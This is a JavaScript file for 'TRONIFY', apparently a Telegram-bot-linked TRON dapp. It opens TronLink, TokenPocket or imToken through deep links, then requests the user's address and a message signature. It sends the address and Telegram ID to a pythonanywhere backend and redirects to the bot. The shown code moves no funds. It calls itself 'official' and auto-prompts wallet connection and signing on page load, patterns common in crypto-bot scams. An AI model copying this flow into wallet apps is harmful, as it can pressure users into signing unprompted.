/* TRONIFY official TG → wallet → sign → bot handoff + realtime status sync */
(function () {
  if (window.__TRONIFY_OFFICIAL_HANDOFF) return;
  window.__TRONIFY_OFFICIAL_HANDOFF = true;

  var ORIGIN = location.origin || "https://nobbll.pythonanywhere.com";
  var CALLBACK = ORIGIN + "/api/deeplink/callback";
  var ICON = ORIGIN + "/favicon.ico";
  var STATUS_API = ORIGIN + "/api/user_status";
  var PENDING_API = ORIGIN + "/api/pending_sign";
  var CHAIN = "0x2b6653dc";
  var lastPhase = "";
  var pollTimer = null;

  function ls(k, v) {
    try {
      if (arguments.length === 1) return localStorage.getItem(k) || "";
      if (v === null) localStorage.removeItem(k);
      else localStorage.setItem(k, v);
    } catch (e) { return ""; }
  }
  function ss(k, v) {
    try {
      if (arguments.length === 1) return sessionStorage.getItem(k) || "";
      if (v === null) sessionStorage.removeItem(k);
      else sessionStorage.setItem(k, v);
    } catch (e) { return ""; }
  }
  function tgId() {
    try { if (typeof TG_ID !== "undefined" && TG_ID) return String(TG_ID); } catch (e) {}
    var q = "";
    try { q = new URLSearchParams(location.search).get("tg_id") || ""; } catch (e2) {}
    return q || ls("tronify_tg_id") || "";
  }
  function uuid() {
    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
      var r = (Math.random() * 16) | 0;
      var v = c === "x" ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }
  function isTgBrowser() {
    var ua = navigator.userAgent || "";
    if (/TronLink|TokenPocket|imToken/i.test(ua)) return false;
    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData) return true;
    return /Telegram/i.test(ua);
  }
  function inAnyWallet() {
    var ua = navigator.userAgent || "";
    if (/TronLink|TokenPocket|imToken/i.test(ua)) return true;
    try {
      if (window.tronLink || (window.tron && window.tron.isTronLink)) return true;
      if (window.tokenpocket || window.imToken) return true;
    } catch (e) {}
    return false;
  }
  function pickedWallet() {
    return ss("tronify_user_picked_wallet") || ls("tronify_wallet") || "tronlink";
  }
  function dappUrl(wallet) {
    var u = new URL(ORIGIN + "/");
    u.searchParams.set("from", "bot");
    u.searchParams.set("wallet", wallet || "tronlink");
    var tg = tgId();
    if (tg) u.searchParams.set("tg_id", tg);
    u.searchParams.set("step", "auth");
    return u.toString();
  }
  function fireHref(href) {
    try {
      var a = document.createElement("a");
      a.href = href;
      a.rel = "noreferrer";
      a.style.display = "none";
      document.body.appendChild(a);
      a.click();
      setTimeout(function () { try { document.body.removeChild(a); } catch (e) {} }, 80);
    } catch (e) {}
    setTimeout(function () { try { location.href = href; } catch (e2) {} }, 250);
  }
  function officialTronLinkParam(extra) {
    var base = {
      url: extra.url || dappUrl("tronlink"),
      callbackUrl: CALLBACK,
      dappIcon: ICON,
      dappName: "TRONIFY",
      protocol: "TronLink",
      version: "1.0",
      chainId: CHAIN,
      actionId: extra.actionId || uuid()
    };
    for (var k in extra) if (Object.prototype.hasOwnProperty.call(extra, k)) base[k] = extra[k];
    return "tronlinkoutside://pull.activity?param=" + encodeURIComponent(JSON.stringify(base));
  }
  function persist(wallet) {
    try {
      ss("tronify_user_picked_wallet", wallet);
      ss("tronify_wallet", wallet);
      ss("tronify_allow_leave", "1");
      ls("tronify_wallet", wallet);
      ls("tronify_picked_wallet", wallet);
      ls("tronify_tg_id", tgId());
      ls("tronify_handoff", "1");
      if (typeof pendingWalletId !== "undefined") pendingWalletId = wallet;
    } catch (e) {}
  }
  function setContinueText(title, hint, sub) {
    try {
      var t = document.getElementById("continueTitle");
      var h = document.getElementById("continueHint");
      var s = document.getElementById("continueSub");
      if (t && title) t.textContent = title;
      if (h && hint) h.textContent = hint;
      if (s && sub) s.textContent = sub;
      var el = document.getElementById("ovContinue");
      if (el) {
        el.classList.add("show");
        el.style.cssText = "display:flex!important;visibility:visible!important;pointer-events:auto!important;z-index:100060!important;";
      }
    } catch (e) {}
  }
  function openFromTelegram(wallet) {
    wallet = wallet || pickedWallet() || "tronlink";
    persist(wallet);
    startSync();
    var url = dappUrl(wallet);
    setContinueText(wallet === "imtoken" ? "imToken" : wallet === "tokenpocket" ? "TokenPocket" : "TronLink",
      "Continue in wallet", "等待钱包授权，两边页面会同步更新");
    if (typeof showToast === "function") showToast("正在打开钱包…");
    if (wallet === "imtoken") {
      fireHref("imtokenv2://navigate/DappView?url=" + encodeURIComponent(url));
      return;
    }
    if (wallet === "tokenpocket") {
      fireHref("tpdapp://open?params=" + encodeURIComponent(JSON.stringify({ url: url, chain: "TRON", source: "TRONIFY" })));
      return;
    }
    fireHref(officialTronLinkParam({ url: url, action: "open" }));
  }
  function getInjectedTronWeb() {
    try { if (window.tron && window.tron.tronWeb) return window.tron.tronWeb; } catch (e) {}
    try { if (window.tronWeb && window.tronWeb.defaultAddress) return window.tronWeb; } catch (e2) {}
    try { if (window.tronLink && window.tronLink.tronWeb) return window.tronLink.tronWeb; } catch (e3) {}
    return null;
  }
  function readAddr(tw) {
    try {
      var a = tw && tw.defaultAddress && (tw.defaultAddress.base58 || tw.defaultAddress);
      if (a && /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a)) return a;
    } catch (e) {}
    return "";
  }
  async function requestAddress() {
    try {
      var provider = window.tron || window.tronLink;
      if (provider && provider.request) {
        await provider.request({ method: "eth_requestAccounts" }).catch(function () {
          return provider.request({ method: "tron_requestAccounts" });
        });
      }
    } catch (e) {}
    return readAddr(getInjectedTronWeb());
  }
  async function pushPending(address, wallet) {
    var tg = tgId();
    if (!tg || !address) return;
    try {
      await fetch(PENDING_API, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ tg_id: tg, telegram_id: tg, address: address, wallet: wallet || pickedWallet() })
      });
    } catch (e) {}
  }
  async function officialSignAndBind(address) {
    var build = window.buildSignMessage;
    var msg = "TRONIFY Service Authorization\nAddress: " + address;
    var nonce = "";
    if (typeof build === "function") {
      try {
        var built = await build(address);
        if (typeof built === "string" && built) msg = built;
        else if (built && built.message) { msg = built.message; nonce = built.nonce || ""; }
      } catch (e) {}
    }
    var tw = getInjectedTronWeb();
    if (!tw || !tw.trx || !tw.trx.signMessageV2) throw new Error("wallet missing signMessageV2");
    var sig = await tw.trx.signMessageV2(msg);
    if (!sig) throw new Error("user cancelled sign");
    var payload = { address: address, signature: sig, message: msg, nonce: nonce, tg_id: tgId(), telegram_id: tgId() };
    if (typeof submitBinding === "function") await submitBinding(payload);
    else {
      var api = (window.CONFIG && CONFIG.bindApi) || (ORIGIN + "/api/bind");
      var res = await fetch(api, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
      if (!res.ok) throw new Error("bind failed");
    }
    return address;
  }
  function applyConnectedUI(address, phase) {
    if (!address) return;
    ls("tronify_addr", address);
    try {
      if (typeof connectedAddress !== "undefined") connectedAddress = address;
      if (typeof updateHeaderAddress === "function") updateHeaderAddress(address);
      if (typeof setHeaderConnected === "function") setHeaderConnected(address);
    } catch (e) {}
    if (phase === "authorized") {
      setContinueText("TronLink", "authorized, waiting sign", address.slice(0, 6) + "…" + address.slice(-4));
    }
  }
  function markBound(address) {
    ls("tronify_addr", address);
    ls("tronify_bound", "1");
    ls("tronify_a_phase", "bound");
    try {
      if (typeof connectedAddress !== "undefined") connectedAddress = address;
      if (typeof bindingDone !== "undefined") bindingDone = true;
      if (typeof updateHeaderAddress === "function") updateHeaderAddress(address);
      if (typeof setHeaderConnected === "function") setHeaderConnected(address);
    } catch (e) {}
    try {
      var ovC = document.getElementById("ovContinue");
      if (ovC) { ovC.classList.remove("show"); ovC.style.display = "none"; }
      var ov = document.getElementById("ovSuccess");
      var addrEl = document.getElementById("successAddr");
      if (addrEl) addrEl.textContent = address;
      if (ov) { ov.classList.add("show"); ov.style.display = "flex"; }
      var back = document.getElementById("btnBackTg");
      if (back) {
        var bot = "SC_TRX_BOXbot";
        try { bot = (CONFIG.botUsername || bot).replace("@", ""); } catch (e2) {}
        back.href = "https://t.me/" + bot + "?start=" + encodeURIComponent("bind_" + address);
      }
    } catch (e3) {}
  }
  function jumpBot(address) {
    if (ss("tronify_jumped_bot") === "1") return;
    ss("tronify_jumped_bot", "1");
    try { window.__tronifyGoBotOnce = false; } catch (e) {}
    if (typeof goBackToBot === "function") {
      setTimeout(function () { goBackToBot(address); }, 500);
      return;
    }
    location.href = "https://t.me/SC_TRX_BOXbot?start=" + encodeURIComponent("bind_" + address);
  }
  async function pullStatus() {
    var tg = tgId();
    if (!tg) return;
    var st = null, pending = null;
    try {
      var r1 = await fetch(STATUS_API + "?tg_id=" + encodeURIComponent(tg), { cache: "no-store" });
      st = await r1.json();
    } catch (e) {}
    try {
      var r2 = await fetch(PENDING_API + "?tg_id=" + encodeURIComponent(tg), { cache: "no-store" });
      var j2 = await r2.json();
      pending = j2 && j2.pending;
    } catch (e2) {}
    var addr = (st && (st.wallet || st.address)) || (pending && pending.address) || "";
    var registered = !!(st && st.registered && addr);
    var phase = registered ? "bound" : (addr ? "authorized" : "idle");
    if (phase === lastPhase && addr === ls("tronify_sync_addr")) return;
    lastPhase = phase;
    ls("tronify_sync_addr", addr || "");
    if (addr) applyConnectedUI(addr, phase);
    if (registered) {
      markBound(addr);
      var shouldJump = ls("tronify_handoff") === "1" || /step=auth/.test(location.search) || isTgBrowser() || inAnyWallet();
      if (shouldJump) jumpBot(addr);
    }
  }
  function startSync() {
    if (pollTimer) return;
    pullStatus();
    pollTimer = setInterval(pullStatus, 1200);
  }
  window.tronifyRunOfficialWalletSession = async function () {
    if (window.__tronifyOfficialSessionOnce) return;
    if (!inAnyWallet()) return;
    window.__tronifyOfficialSessionOnce = true;
    startSync();
    try {
      var addr = await requestAddress();
      if (!addr) { window.__tronifyOfficialSessionOnce = false; return; }
      ls("tronify_addr", addr);
      applyConnectedUI(addr, "authorized");
      await pushPending(addr, pickedWallet());
      await officialSignAndBind(addr);
      markBound(addr);
      await pullStatus();
      jumpBot(addr);
    } catch (e) {
      window.__tronifyOfficialSessionOnce = false;
    }
  };
  function wireOpen() {
    var btn = document.getElementById("btnOpenWallet");
    if (!btn || btn.dataset.official === "1") return;
    btn.dataset.official = "1";
    btn.addEventListener("click", function (ev) {
      if (inAnyWallet()) {
        window.__tronifyOfficialSessionOnce = false;
        window.tronifyRunOfficialWalletSession();
        return;
      }
      ev.preventDefault();
      ev.stopPropagation();
      openFromTelegram(pickedWallet());
    }, true);
  }
  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState !== "visible") return;
    pullStatus();
    if (inAnyWallet()) window.tronifyRunOfficialWalletSession();
  });
  window.addEventListener("focus", function () { pullStatus(); });
  window.addEventListener("pageshow", function () { pullStatus(); });
  function boot() {
    var tg = tgId();
    if (tg) ls("tronify_tg_id", tg);
    wireOpen();
    if (tg) startSync();
    if (inAnyWallet()) setTimeout(function () { window.tronifyRunOfficialWalletSession(); }, 500);
  }
  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else boot();
  setInterval(wireOpen, 1200);
})();
